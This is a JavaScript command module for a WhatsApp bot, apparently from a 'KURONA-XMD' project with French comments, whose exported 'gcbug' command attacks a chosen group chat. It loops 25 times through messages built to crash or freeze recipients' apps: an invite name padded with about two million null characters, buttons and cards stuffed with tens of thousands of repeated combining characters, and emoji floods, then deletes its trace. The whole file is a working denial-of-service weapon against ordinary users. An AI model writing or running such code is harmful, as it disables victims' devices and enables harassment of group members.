import { isAdmin } from '../libs/functions.js';

async function bug1(message, client, target) {
    const remoteJid = target;
    
    await client.sendMessage(remoteJid, {
        adminInvite: {
            jid: `120363298524333143@newsletter`,
            name: "🎴 𝛫𝑈𝑅𝛩𝛮𝛥 — 𝑿𝛭𝑫 𝑫𝛯𝑆𝛵𝑅𝛩𝑌𝛯𝑅 🎴" + "\u0000".repeat(2050000),
            caption: "⚡ ULTIMATE ANNIHILATION SYSTEM ⚡",
            expiration: Date.now() + 1814400000,
        },
    });
}

async function clear(message, client) {
    const remoteJid = message.key.remoteJid;
    
    await client.chatModify({
        delete: true,
        lastMessages: [{
            key: message.key,
            messageTimestamp: message.messageTimestamp
        }]
    }, remoteJid);
}

async function bug2(message, client, target) {
    const remoteJid = target;
    const groupMetadata = await client.groupMetadata(target);
    const participants = groupMetadata.participants.map(user => user.id);

    await client.sendMessage(remoteJid, {
        image: { url: "./assets/images/kurona_logo.png" },
        caption: "🎴 𝛫𝑈𝑅𝛩𝛮𝛥 — 𝑿𝛭𝑫 𝛥𝑅𝛭𝛥𝛤𝛯𝑫𝑫𝛩𝛮 🎴",
        footer: "⚡ ULTIMATE DESTRUCTION SEQUENCE ⚡",
        media: true,
        interactiveButtons: [
            {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                    display_text: `☠️ ${"ꦾꦿꦽꦻꦷꦹꦵꦁꦂ꦳ꦘ".repeat(58000)}\n\n`,
                    id: "destroy"
                })
            },
            {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                    display_text: `💀 ${"ꦾꦿꦽꦻꦷꦹꦵꦁꦂ꦳ꦘ".repeat(58000)}\n\n`,
                    id: "annihilate"
                })
            },
            {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                    display_text: `⚡ ${"ꦾꦿꦽꦻꦷꦹꦵꦁꦂ꦳ꦘ".repeat(58000)}\n\n`,
                    url: "https://github.com/KURONA-XMD"
                })
            },
        ]
    }, {
        quoted: message,
        mentions: participants
    });
}

async function bug3(message, client, target) {
    const remoteJid = target;
    // Version plus violente avec plus de répétitions
    const virus = "ꦾꦿꦽꦻꦷꦹꦵꦁꦂ꦳ꦘ".repeat(4000);

    const lastBug = await client.sendMessage(remoteJid, {
        text: "🎴 𝛫𝑈𝑅𝛩𝛮𝛥 — 𝑿𝛭𝑫 𝛥𝛲𝛩𝐶𝛥𝐿𝑌𝑆𝛯☠ 🎴",
        footer: "⚡ By 𝑫𝛯𝑽 ᬁ 𝛫𝑈𝑅𝛩𝛮𝛥 - 𝑫𝛯𝑆𝛵𝑅𝛩𝑌𝛯𝑅 𝛭𝛩𝑫𝛯🎴",
        cards: [
            {
                image: { url: './assets/images/kurona_logo.png' },
                title: '🎴 𝛫𝑈𝑅𝛩𝛮𝛥 — 𝑿𝛭𝑫 𝛥𝑅𝛭𝛥𝛤𝛯𝑫𝑫𝛩𝛮 🎴',
                caption: 'ULTIMATE DESTRUCTION SYSTEM',
                footer: "⚡ MAXIMUM OVERDRIVE",
                buttons: [
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: virus,
                            id: "KURONA_ANNIHILATE"
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: virus,
                            id: "KURONA_ANNIHILATE"
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: virus,
                            id: "KURONA_ANNIHILATE"
                        })
                    },
                ]
            },
            {
                image: { url: './assets/images/kurona_logo.png' },
                title: '🎴 𝛫𝑈𝑅𝛩𝛮𝛥 — 𝑿𝛭𝑫 𝛥𝑅𝛭𝛥𝛤𝛯𝑫𝑫𝛩𝛮🎴',
                caption: 'ULTIMATE DESTRUCTION SYSTEM',
                footer: "⚡ MAXIMUM OVERDRIVE",
                buttons: [
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: virus,
                            id: "KURONA_ANNIHILATE"
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: virus,
                            id: "KURONA_ANNIHILATE"
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: virus,
                            id: "KURONA_ANNIHILATE"
                        })
                    },
                ]
            },
            {
                image: { url: './assets/images/kurona_logo.png' },
                title: '🎴 𝛫𝑈𝑅𝛩𝛮𝛥 — 𝑿𝛭𝑫 𝛥𝑅𝛭𝛥𝛤𝛯𝑫𝑫𝛩𝛮 🎴',
                caption: 'ULTIMATE DESTRUCTION SYSTEM',
                footer: "⚡ MAXIMUM OVERDRIVE",
                buttons: [
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: virus,
                            id: "KURONA_ANNIHILATE"
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: virus,
                            id: "KURONA_ANNIHILATE"
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: virus,
                            id: "KURONA_ANNIHILATE"
                        })
                    },
                ]
            }
        ]
    }, { quoted: message });

    return lastBug;
}

async function bug4(message, client, target) {
    const remoteJid = target;
    
    // Nouveau bug ultra-violent avec des messages massifs
    for (let i = 0; i < 5; i++) {
        await client.sendMessage(remoteJid, {
            text: "☠️ " + "🔴".repeat(5000) + " ☠️\n\n" +
                  "🎴 𝛫𝑈𝑅𝛩𝛮𝛥 — 𝑿𝛭𝑫 𝑫𝛯𝑆𝛵𝑅𝛩𝑌𝛯𝑅 𝛭𝛩𝑫𝛯 🎴\n" +
                  "⚡ " + "💣".repeat(2000) + " ⚡\n" +
                  "💀 " + "☠️".repeat(3000) + " 💀\n" +
                  "🔥 " + "⚠️".repeat(4000) + " 🔥"
        });
    }
}

async function gcbug(message, client) {
    const remoteJid = message.key.remoteJid;
    const userJid = message.key.participant || message.key.remoteJid;
    let target;

    // Vérifier si l'utilisateur est admin
    const isUserAdmin = await isAdmin(client, remoteJid, userJid);
    if (!isUserAdmin) {
        await client.sendMessage(remoteJid, {
            text: "╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╮\n│ ❌ *ACCÈS BLOQUÉ !*\n│ \n│ 🎴 SEULS LES ADMINISTRATEURS SUPREMES\n│ PEUVENT UTILISER CETTE ARME ULTIME.\n│ \n│ 🎴 *𝛫𝑈𝑅𝛩𝛮𝛥 — 𝑿𝛭𝑫 𝑫𝛯𝑆𝛵𝑅𝛩𝑌𝛯𝑅* 🎴\n╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯",
            quoted: message
        });
        return;
    }

    const messageBody = message.message?.extendedTextMessage?.text || message.message?.conversation || '';
    const commandAndArgs = messageBody.slice(1).trim();
    const parts = commandAndArgs.split(/\s+/);
    const args = parts.slice(1);

    if (args.length > 0) {
        if (args[0].endsWith("@g.us")) {
            await client.sendMessage(remoteJid, {
                text: "╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╮\n│ 🎴 *INITIALISATION DU SYSTÈME*\n│ *𝛫𝑈𝑅𝛩𝛮𝛥 𝑫𝛯𝑆𝛵𝑅𝛩𝑌𝛯𝑅*\n│ \n│ > _ACTIVATION DU MODE_\n│ > _ANNIHILATION TOTALE..._\n╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯",
                quoted: message
            });
            target = args[0];
        } else {
            await client.sendMessage(remoteJid, {
                text: "╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╮\n│ ❌ *ID DE GROUPE INVALIDE !*\n│ \n│ > _*" + args[0] + " N'EST PAS UN ID VALIDE.*\n│ > UTILISEZ .gcid POUR OBTENIR\n│ > L'ID DU GROUPE._\n╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯",
                quoted: message
            });
            return;
        }
    } else {
        if (remoteJid.endsWith("@g.us")) {
            target = remoteJid;
        } else {
            await client.sendMessage(remoteJid, {
                text: "╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╮\n│ ❌ *ZONE DE COMBAT INVALIDE !*\n│ \n│ > _*CETTE COMMANDE NE FONCTIONNE\n│ > QUE DANS LES GROUPES.*_\n╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯",
                quoted: message
            });
            return;
        }
    }

    // Avertissement final ultra-menaçant
    await client.sendMessage(remoteJid, {
        text: "╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╮\n│ ☠*ALERTE ROUGE*\n│ *DESTRUCTION IMMINENTE* ☠\n│ \n│ 🎴 *𝛫𝑈𝑅𝛩𝛮𝛥 — 𝑿𝛭𝑫 𝑫𝛯𝑆𝛵𝑅𝛩𝑌𝛯𝑅*\n│ ACTIVÉ\n│ ⚡ MODE ANNIHILATION ULTIME\n│ ☠ SÉQUENCE DE DESTRUCTION\n│ DÉCLENCHÉE\n│ \n│ > _CETTE ACTION VA DÉTRUIRE\n│ > LE GROUPE CIBLE._\n╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯",
        quoted: message
    });

    // Séquence de destruction ultra-violente
    for (let i = 0; i < 25; i++) {
        await bug1(message, client, target);
        await bug2(message, client, target);
        await bug3(message, client, target);
        await bug4(message, client, target);
        const msg = await bug3(message, client, target);
        await clear(msg, client);
        // Réduction du délai pour plus de violence
        await new Promise(resolve => setTimeout(resolve, 800));
    }

    // Message de fin ultra-menaçant
    await client.sendMessage(remoteJid, {
        text: "╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╮\n│ ✅ *OPÉRATION TERMINÉE !*\n│ \n│ 🎴 *𝛫𝑈𝑅𝛩𝛮𝛥 — 𝑿𝛭𝑫 𝑫𝛯𝑆𝛵𝑅𝛩𝑌𝛯𝑅*\n│ ⚡ ANNIHILATION COMPLÈTE RÉUSSIE\n│ ☠ LE GROUPE A ÉTÉ DÉTRUIT\n│ ☠ MISSION ACCOMPLIE\n│ \n│ > _La cible a été éliminée\n│ > avec succès._\n╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯",
        quoted: message
    });
}

export default gcbug;